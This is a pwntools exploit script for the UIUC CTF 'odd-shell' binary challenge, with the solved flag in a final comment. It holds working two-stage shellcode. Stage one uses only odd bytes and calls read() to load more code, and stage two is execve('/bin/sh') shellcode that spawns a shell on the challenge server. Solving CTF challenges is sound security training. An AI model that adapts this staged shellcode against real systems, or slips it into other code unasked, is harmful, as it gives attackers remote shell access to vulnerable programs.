
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./src/chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# call <shellcode>
hbreak *main+0x15d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'odd-shell.chal.uiuc.tf'
    remote_port = 1337
    io = remote(remote_server, remote_port)
    io.recvline() # == proof-of-work: disabled ==
else:
    io = start(arguments)

io.recvline()

'''
00101173 31 db           XOR        EBX,EBX
00101175 83 c3 1f        ADD        EBX,0x1f
00101178 c1 e3 05        SHL        EBX,0x3
0010117b 8b d3           MOV        EDX,EBX
0010117d 0f 05           SYSCALL

read(0, 0x00123412340000, 0x3E0)	# read is syscall no 0
<SHELLCODE OVERWRITTEN>
'''
stage1_shellcode  = b'\x31\xdb\x83\xc3\x1f\xc1\xe3\x05\x8b\xd3\x0f\x05'

# http://www.shell-storm.org/shellcode/files/shellcode-603.php
# Slightly modified
stage2_shellcode = asm('''
xor     rdx, rdx
push    rdx
mov     rbx, 0x0068732f6e69622f
push    rbx
mov     rdi, rsp
push    rdx
push    rdi
mov     rsi, rsp
mov     eax, 0x3b
syscall
''')

io.send(stage1_shellcode + b'A'*(0x800-len(stage1_shellcode)))
io.send(b'A'*len(stage1_shellcode) + stage2_shellcode + b'A'*(0x3e0-len(stage1_shellcode)-len(stage2_shellcode)))

io.interactive()

# print(io.recvall())
io.close()

# uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}
